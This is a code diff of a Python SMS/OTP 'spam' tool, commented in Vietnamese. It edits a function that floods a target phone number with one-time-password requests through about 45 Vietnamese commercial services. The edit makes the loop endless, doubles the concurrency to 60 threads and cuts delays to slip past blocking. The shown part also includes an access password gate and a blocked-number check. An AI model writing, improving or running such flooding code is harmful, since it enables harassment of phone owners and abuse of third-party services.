@@ -3250,75 +3250,44 @@ import time
 
 # ... (các hàm send_otp_via_... đã được định nghĩa ở trên)
 
-def spam_lien_tuc(phone, so_lan):
+def spam_lien_tuc(phone):
     functions = [
-        send_otp_via_cashbar,
-        send_otp_via_pizzacompany,
-        send_otp_via_sapo,
-        send_otp_via_viettel,
-        send_otp_via_medicare,
-        send_otp_via_tv360,
-        send_otp_via_dienmayxanh,
-        send_otp_via_kingfoodmart,
-        send_otp_via_mocha,
-        send_otp_via_fptdk,
-        send_otp_via_fptmk,
-        send_otp_via_VIEON,
-        send_otp_via_ghn,
-        send_otp_via_lottemart,
-        send_otp_via_DONGCRE,
-        send_otp_via_shopee,
-        send_otp_via_TGDD,
-        send_otp_via_fptshop,
-        send_otp_via_WinMart,
-        send_otp_via_vietloan,
-        send_otp_via_lozi,
-        send_otp_via_F88,
-        send_otp_via_spacet,
-        send_otp_via_vinpearl,
-        send_otp_via_vinamilk,
-        send_otp_via_vietloan2,
-        send_otp_via_batdongsan,
-        send_otp_via_GUMAC,
-        send_otp_via_mutosi,
-        send_otp_via_mutosi1,
-        send_otp_via_vietair,
-        send_otp_via_FAHASA,
-        send_otp_via_hopiness,
-        send_otp_via_modcha35,
-        send_otp_via_Bibabo,
-        send_otp_via_MOCA,
-        send_otp_via_pantio,
-        send_otp_via_Routine,
-        send_otp_via_vayvnd,
-        send_otp_via_tima,
-        send_otp_via_moneygo,
-        send_otp_via_takomo,
-        send_otp_via_paynet,
-        send_otp_via_pico,
-        send_otp_via_PNJ,
+        send_otp_via_cashbar, send_otp_via_pizzacompany, send_otp_via_sapo,
+        send_otp_via_viettel, send_otp_via_medicare, send_otp_via_tv360,
+        send_otp_via_dienmayxanh, send_otp_via_kingfoodmart, send_otp_via_mocha,
+        send_otp_via_fptdk, send_otp_via_fptmk, send_otp_via_VIEON,
+        send_otp_via_ghn, send_otp_via_lottemart, send_otp_via_DONGCRE,
+        send_otp_via_shopee, send_otp_via_TGDD, send_otp_via_fptshop,
+        send_otp_via_WinMart, send_otp_via_vietloan, send_otp_via_lozi,
+        send_otp_via_F88, send_otp_via_spacet, send_otp_via_vinpearl,
+        send_otp_via_vinamilk, send_otp_via_vietloan2, send_otp_via_batdongsan,
+        send_otp_via_GUMAC, send_otp_via_mutosi, send_otp_via_mutosi1,
+        send_otp_via_vietair, send_otp_via_FAHASA, send_otp_via_hopiness,
+        send_otp_via_modcha35, send_otp_via_Bibabo, send_otp_via_MOCA,
+        send_otp_via_pantio, send_otp_via_Routine, send_otp_via_vayvnd,
+        send_otp_via_tima, send_otp_via_moneygo, send_otp_via_takomo,
+        send_otp_via_paynet, send_otp_via_pico, send_otp_via_PNJ,
     ]
 
-    print(f"{Fore.RED}🔥 BẮT ĐẦU SPAM {so_lan} LẦN LIÊN TỤC CHO SỐ: {phone}{Style.RESET_ALL}")
-    print("=" * 70)
+    print(f"{Fore.RED}🔥 BẮT ĐẦU SPAM LIÊN TỤC SIÊU NHANH CHO SỐ: {phone}{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}Nhấn Ctrl + C để dừng tool{Style.RESET_ALL}")
+    print("=" * 80)
 
-    for lan in range(1, so_lan + 1):
-        print(f"\n{Fore.YELLOW}[{lan}/{so_lan}] Đang spam lần {lan}...{Style.RESET_ALL}")
+    lan = 0
+    while True:
+        lan += 1
+        print(f"\n{Fore.CYAN}[VÒNG {lan}] Đang spam...{Style.RESET_ALL}")
 
-        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:  # Giảm từ 120 xuống 30 để tránh bị block
+        with concurrent.futures.ThreadPoolExecutor(max_workers=60) as executor:   # Tăng lên 60
             futures = [executor.submit(fn, phone) for fn in functions]
             for future in concurrent.futures.as_completed(futures):
                 try:
-                    future.result()
-                except Exception as e:
-                    pass  # Bỏ qua lỗi để tool không dừng
+                    future.result(timeout=8)   # Giới hạn mỗi request tối đa 8 giây
+                except:
+                    pass
 
-        print(f"{Fore.GREEN}✅ Hoàn thành lần {lan}/{so_lan}{Style.RESET_ALL}")
-
-        if lan < so_lan:
-            time.sleep(0.3)  # Tăng nhẹ delay để tránh bị chặn
-
-    print(f"\n{Fore.CYAN}🎉 HOÀN TẤT TOÀN BỘ {so_lan} LẦN SPAM!{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}✅ Hoàn thành vòng {lan} - Tiếp tục ngay...{Style.RESET_ALL}")
+        time.sleep(0.35)   # Giảm mạnh delay (có thể thử 0.2 nếu muốn cực nhanh)
         
 import os
 import sys
@@ -3513,7 +3482,7 @@ if code != "obiiyeuem":
     quit()
 
 phone = input(txt_phone)
-if phone == "0949557645":
+if phone == "deltax":
     print(txt_block)
     quit()
 
